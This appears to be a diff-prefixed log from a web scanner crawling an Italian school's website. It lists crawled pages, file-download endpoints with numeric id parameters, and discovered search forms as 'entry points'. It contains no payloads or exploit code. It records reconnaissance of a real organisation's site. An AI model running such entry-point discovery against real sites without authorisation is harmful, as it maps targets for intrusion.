+2025-06-17 04:55:23,788 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/panoramica/Didattica?source=7
+2025-06-17 04:55:23,853 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/panoramica/Didattica?source=7 (Status: 509 or non-HTML).
+2025-06-17 04:55:23,854 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/scuola-digitale
+2025-06-17 04:55:23,919 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/scuola-digitale (Status: 509 or non-HTML).
+2025-06-17 04:55:23,919 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/cambridge
+2025-06-17 04:55:23,984 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/cambridge (Status: 509 or non-HTML).
+2025-06-17 04:55:23,984 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/frisali
+2025-06-17 04:55:24,049 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/frisali (Status: 509 or non-HTML).
+2025-06-17 04:55:24,050 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/erasmus-
+2025-06-17 04:55:24,115 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/erasmus- (Status: 509 or non-HTML).
+2025-06-17 04:55:24,115 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/progetto-bormida
+2025-06-17 04:55:24,181 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/progetto-bormida (Status: 509 or non-HTML).
+2025-06-17 04:55:24,181 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/settimana-pianeta-terra
+2025-06-17 04:55:24,246 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/settimana-pianeta-terra (Status: 509 or non-HTML).
+2025-06-17 04:55:24,247 - INFO - Crawling [Depth:2]: http://iislevimontalcini.it/pagine/erasmus-pathway-through-religions
+2025-06-17 04:55:24,315 - WARNING - [93m[WARN][0m Skipped http://iislevimontalcini.it/pagine/erasmus-pathway-through-religions (Status: 509 or non-HTML).
+2025-06-17 04:55:24,315 - INFO - [1;32m[INFO][0m 197 URLs crawled from iislevimontalcini.it.
+2025-06-17 04:55:24,315 - INFO - [1;32m[INFO][0m Total unique URLs found for processing: 197[0m
+2025-06-17 04:55:24,316 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2368725&inl=1
+2025-06-17 04:55:24,618 - WARNING - [93m[WARN][0m Failed to fetch http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2368725&inl=1 for entry point discovery: 'utf-8' codec can't decode byte 0xe2 in position 10: invalid continuation byte[0m
+2025-06-17 04:55:24,619 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3189
+2025-06-17 04:55:24,685 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/regolamento-di-istituto
+2025-06-17 04:55:24,751 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3175
+2025-06-17 04:55:24,816 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=17
+2025-06-17 04:55:24,882 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=385
+2025-06-17 04:55:24,948 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3417
+2025-06-17 04:55:25,016 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/piano-offerta-formativa
+2025-06-17 04:55:25,082 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/perfezionamento-iscrizioni-classi-prime-20232024
+2025-06-17 04:55:25,150 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/accreditamento-regionale
+2025-06-17 04:55:25,215 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=389
+2025-06-17 04:55:25,280 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393323
+2025-06-17 04:55:25,346 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2368725
+2025-06-17 04:55:25,411 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3411
+2025-06-17 04:55:25,477 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/curricolo-verticale-distituto
+2025-06-17 04:55:25,543 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/il-levi-montalcini-a-scuola-futura
+2025-06-17 04:55:25,609 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3604
+2025-06-17 04:55:25,970 - WARNING - [93m[WARN][0m Failed to fetch http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3604 for entry point discovery: 'utf-8' codec can't decode byte 0xb5 in position 11: invalid start byte[0m
+2025-06-17 04:55:25,971 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387601
+2025-06-17 04:55:26,036 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3417
+2025-06-17 04:55:26,102 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/cambridge
+2025-06-17 04:55:26,350 - INFO - [36mForm found: http://iislevimontalcini.it/cerca (GET)[0m
+2025-06-17 04:55:26,350 - INFO - [36mForm found: http://iislevimontalcini.it/pagine/cambridge (GET)[0m
+2025-06-17 04:55:26,350 - INFO - [36mForm found: http://iislevimontalcini.it/cerca (GET)[0m
+2025-06-17 04:55:26,351 - INFO - [36mForm found: http://iislevimontalcini.it/pagine/cambridge (GET)[0m
+2025-06-17 04:55:26,353 - INFO - Discovering entry points [Depth:1]: tel:Tel. 0144 31.25.50
+2025-06-17 04:55:26,353 - WARNING - [93m[WARN][0m Failed to fetch tel:Tel. 0144 31.25.50 for entry point discovery: tel:Tel.%200144%2031.25.50[0m
+2025-06-17 04:55:26,353 - INFO - Discovering entry points [Depth:1]: mailto:alis003006@istruzione.it 
+2025-06-17 04:55:26,353 - WARNING - [93m[WARN][0m Failed to fetch mailto:alis003006@istruzione.it  for entry point discovery: mailto:alis003006@istruzione.it%20[0m
+2025-06-17 04:55:26,353 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it#maincontent
+2025-06-17 04:55:26,439 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/
+2025-06-17 04:55:26,504 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387723
+2025-06-17 04:55:26,570 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/panoramica/Didattica?source=7
+2025-06-17 04:55:26,635 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/progetto-bormida
+2025-06-17 04:55:26,700 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/libri-di-testo-as-20202021
+2025-06-17 04:55:26,766 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/piano-scuola-40---azione-1---next-generation-labs-1
+2025-06-17 04:55:26,831 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/il-corso-di-biotecnologie-ambientali-vince-il-premio-acqui-ambiente-2024
+2025-06-17 04:55:26,897 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=391
+2025-06-17 04:55:26,963 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3205
+2025-06-17 04:55:27,028 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393323&inl=1
+2025-06-17 04:55:27,094 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/cookie-policy
+2025-06-17 04:55:27,159 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/note-legali
+2025-06-17 04:55:27,224 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=389
+2025-06-17 04:55:27,290 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/covid-19
+2025-06-17 04:55:27,355 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/progetti#maincontent
+2025-06-17 04:55:27,421 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/prenotazioni/
+2025-06-17 04:55:27,486 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/startup-tra-i-banchi-di-scuola-premiati-dalla-confindustria-gli-studenti-dellindirizzo-afm-sia
+2025-06-17 04:55:27,552 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356305&inl=1
+2025-06-17 04:55:27,618 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/regolamento-di-istituto#maincontent
+2025-06-17 04:55:27,683 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3491
+2025-06-17 04:55:27,748 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356305
+2025-06-17 04:55:27,813 - INFO - Discovering entry points [Depth:0]: https://iislevimontalcini.it
+2025-06-17 04:55:27,939 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2633670
+2025-06-17 04:55:28,004 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393322
+2025-06-17 04:55:28,071 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3860
+2025-06-17 04:55:28,136 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2843638&inl=1
+2025-06-17 04:55:28,202 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=295
+2025-06-17 04:55:28,271 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3499
+2025-06-17 04:55:28,337 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/frisali
+2025-06-17 04:55:28,403 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it
+2025-06-17 04:55:28,469 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/educazione-civica
+2025-06-17 04:55:28,534 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/azioni-di-prevenzione-e-contrasto-alla-dispersione-scolastica
+2025-06-17 04:55:28,600 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/segreteria#maincontent
+2025-06-17 04:55:28,669 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1483
+2025-06-17 04:55:28,735 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2848940&inl=1
+2025-06-17 04:55:28,802 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/urp
+2025-06-17 04:55:28,868 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/#maincontent
+2025-06-17 04:55:28,936 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=385
+2025-06-17 04:55:29,009 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3438
+2025-06-17 04:55:29,074 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3207
+2025-06-17 04:55:29,141 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1485
+2025-06-17 04:55:29,207 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1481
+2025-06-17 04:55:29,272 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/amministrazione-trasparente
+2025-06-17 04:55:29,338 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356304
+2025-06-17 04:55:29,403 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3173
+2025-06-17 04:55:29,471 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356282
+2025-06-17 04:55:29,537 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1481
+2025-06-17 04:55:29,602 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/viaggi-di-istruzione
+2025-06-17 04:55:29,669 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/dirigente-scolastico
+2025-06-17 04:55:29,735 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/piano-scuola-40---azione-1---next-generation-labs
+2025-06-17 04:55:29,800 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/voci-fuori-campo-emozioni-in-scena-alla-sala-ex-kaimano---il-gran-finale-del-laboratorio-teatrale-dellistituto-montalcini
+2025-06-17 04:55:29,869 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/disclaimer
+2025-06-17 04:55:29,935 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3171
+2025-06-17 04:55:30,001 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/erasmus-pathway-through-religions
+2025-06-17 04:55:30,067 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3171
+2025-06-17 04:55:30,133 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/liis-rita-levi-montalcini-si-distingue-al-campionato-provinciale-di-atletica-leggera
+2025-06-17 04:55:30,199 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/comitato-tecnico-scientifico
+2025-06-17 04:55:30,265 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/istituto-tecnico-settore-economico---turismo-1
+2025-06-17 04:55:30,331 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3411
+2025-06-17 04:55:30,396 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=387
+2025-06-17 04:55:30,462 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/pon-pcto-estero-progetto-fse--per-la-scuola-competenze-e-ambienti-per-lapprendimento-2014-2020
+2025-06-17 04:55:30,528 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393322&inl=1
+2025-06-17 04:55:30,741 - WARNING - [93m[WARN][0m Failed to fetch http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2393322&inl=1 for entry point discovery: 'utf-8' codec can't decode byte 0xb5 in position 11: invalid start byte[0m
+2025-06-17 04:55:30,742 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3175
+2025-06-17 04:55:30,807 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/il-rita-levi-montalcini-allhackathon-di-piacenza-incontra-il-presidente-mattarella
+2025-06-17 04:55:30,872 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/il-levi-montalcini-premiato-a-roma-dalla-fondazione-cotec
+2025-06-17 04:55:30,939 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1485
+2025-06-17 04:55:31,004 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/albo-online
+2025-06-17 04:55:31,070 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3499
+2025-06-17 04:55:31,136 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/organi-collegiali#maincontent
+2025-06-17 04:55:31,201 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/istituto-professionale---manutenzione-e-assistenza-tecnica-curvatura-termica
+2025-06-17 04:55:31,268 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=925
+2025-06-17 04:55:31,335 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/accreditamento-regionale#maincontent
+2025-06-17 04:55:31,400 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/la-fondazione-cigno--incontra-le-ragazze-e-i-ragazzi-del-rita-levi-montalcini-1
+2025-06-17 04:55:31,469 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2387723&inl=1
+2025-06-17 04:55:31,534 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/orario-lezioni
+2025-06-17 04:55:31,600 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2633670&inl=1
+2025-06-17 04:55:31,666 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/pon---fse-e-fdr---apprendimento-e-socialit-
+2025-06-17 04:55:31,742 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/brochure-offerta-formativa
+2025-06-17 04:55:32,161 - INFO - [36mForm found: http://iislevimontalcini.it/cerca (GET)[0m
+2025-06-17 04:55:32,161 - INFO - [36mForm found: http://iislevimontalcini.it/pagine/brochure-offerta-formativa (GET)[0m
+2025-06-17 04:55:32,161 - INFO - [36mForm found: http://iislevimontalcini.it/cerca (GET)[0m
+2025-06-17 04:55:32,161 - INFO - [36mForm found: http://iislevimontalcini.it/pagine/brochure-offerta-formativa (GET)[0m
+2025-06-17 04:55:32,163 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1575
+2025-06-17 04:55:32,414 - WARNING - [93m[WARN][0m Failed to fetch http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1575 for entry point discovery: 'utf-8' codec can't decode byte 0xb5 in position 11: invalid start byte[0m
+2025-06-17 04:55:32,414 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=839
+2025-06-17 04:55:32,479 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3205
+2025-06-17 04:55:32,546 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/comunicati
+2025-06-17 04:55:32,612 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3207
+2025-06-17 04:55:32,677 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/contatti
+2025-06-17 04:55:32,742 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/adempimenti-vaccinali-relativi-ai-minorenni
+2025-06-17 04:55:32,808 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/-privacy#maincontent
+2025-06-17 04:55:32,874 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/moduli-moodle-per-il-recupero-del-curricolo-obbligatorio
+2025-06-17 04:55:32,940 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/la-4-giorni-frisali-a-udine
+2025-06-17 04:55:33,006 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2342575&inl=1
+2025-06-17 04:55:33,072 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3189
+2025-06-17 04:55:33,137 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=1477
+2025-06-17 04:55:33,203 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/istituto-tecnico-settore-economico---amministrazione-finanza-e-marketing
+2025-06-17 04:55:33,269 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/codice-disciplinare-e-codici-di-comportamento
+2025-06-17 04:55:33,336 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/segreteria
+2025-06-17 04:55:33,403 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/pnsd---piano-nazionale-scuola-digitale
+2025-06-17 04:55:33,468 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/eccellenza-e-merito-gli-studenti-premiati-allistituto-rita-levi-montalcini
+2025-06-17 04:55:33,534 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=387
+2025-06-17 04:55:33,600 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3860
+2025-06-17 04:55:33,666 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3604
+2025-06-17 04:55:33,732 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356304&inl=1
+2025-06-17 04:55:33,798 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/dirigente-scolastico#maincontent
+2025-06-17 04:55:33,864 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/convegno-una-storia-dentro-le-carte
+2025-06-17 04:55:33,932 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=3859
+2025-06-17 04:55:33,998 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/erasmus-
+2025-06-17 04:55:34,064 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=2031
+2025-06-17 04:55:34,130 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/panoramica/Istituto?source=1
+2025-06-17 04:55:34,196 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/esame-di-stato
+2025-06-17 04:55:34,261 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/1-6-settembre-2023---diario-dallargentina
+2025-06-17 04:55:34,327 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/progetti
+2025-06-17 04:55:34,393 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/pai
+2025-06-17 04:55:34,459 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2848940
+2025-06-17 04:55:34,527 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/diploma-istruzioni-per-il-ritiro
+2025-06-17 04:55:34,593 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/piano-scuola-40---azione-1---next-generation-class-
+2025-06-17 04:55:34,658 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/nuovi-indirizzi-del-tecnico-economico
+2025-06-17 04:55:34,724 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2342575
+2025-06-17 04:55:34,789 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/assicurazione
+2025-06-17 04:55:34,856 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2909837
+2025-06-17 04:55:34,922 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=925
+2025-06-17 04:55:34,987 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=17
+2025-06-17 04:55:35,053 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/istituto-tecnico-settore-economico---turismo
+2025-06-17 04:55:35,119 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/area-personale
+2025-06-17 04:55:35,184 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/partner-territoriali#maincontent
+2025-06-17 04:55:35,250 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/modulistica-famiglie
+2025-06-17 04:55:35,316 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/progetto-nerd
+2025-06-17 04:55:35,382 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/orientamento
+2025-06-17 04:55:35,447 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=3173
+2025-06-17 04:55:35,512 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/archivio-news
+2025-06-17 04:55:35,578 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=2987
+2025-06-17 04:55:35,643 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/organi-collegiali
+2025-06-17 04:55:35,711 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/istituto-tecnico-settore-tecnologico---elettrotecnico-ed-elettronico
+2025-06-17 04:55:35,776 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2909837&inl=1
+2025-06-17 04:55:35,842 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=391
+2025-06-17 04:55:35,908 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/avvio-as-202425---orario-lezioni-e-comunicazioni
+2025-06-17 04:55:35,973 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2356282&inl=1
+2025-06-17 04:55:36,040 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/scuola-digitale
+2025-06-17 04:55:36,106 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=2987
+2025-06-17 04:55:36,172 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2573131&inl=1
+2025-06-17 04:55:38,720 - WARNING - [93m[WARN][0m Failed to fetch http://iislevimontalcini.it/pvw/app/default/pvw_img.php?sede_codice=ALII0010&doc=2573131&inl=1 for entry point discovery: 'utf-8' codec can't decode byte 0xb5 in position 11: invalid start byte[0m
+2025-06-17 04:55:38,720 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione
+2025-06-17 04:55:38,954 - INFO - [36mForm found: http://iislevimontalcini.it/cerca (GET)[0m
+2025-06-17 04:55:38,955 - INFO - [36mForm found: http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione (GET)[0m
+2025-06-17 04:55:38,955 - INFO - [36mForm found: http://iislevimontalcini.it/cerca (GET)[0m
+2025-06-17 04:55:38,955 - INFO - [36mForm found: http://iislevimontalcini.it/pagine/sistema-nazionale-di-valutazione (GET)[0m
+2025-06-17 04:55:38,957 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=393
+2025-06-17 04:55:39,169 - WARNING - [93m[WARN][0m Failed to fetch http://iislevimontalcini.it/pvw2/app/default/tools.php?act=viewFile&id=393 for entry point discovery: 'utf-8' codec can't decode byte 0xd2 in position 16: invalid continuation byte[0m
+2025-06-17 04:55:39,169 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=1575
+2025-06-17 04:55:39,235 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pvw2/app/default/tools.php?act=downloadFile&id=913
+2025-06-17 04:55:39,301 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/allenamento-fuori-dagli-schemi-quando-la-citt-diventa-la-tua-palestra--il-progetto-suburban
+2025-06-17 04:55:39,367 - INFO - Discovering entry points [Depth:0]: http://iislevimontalcini.it/pagine/-privacy
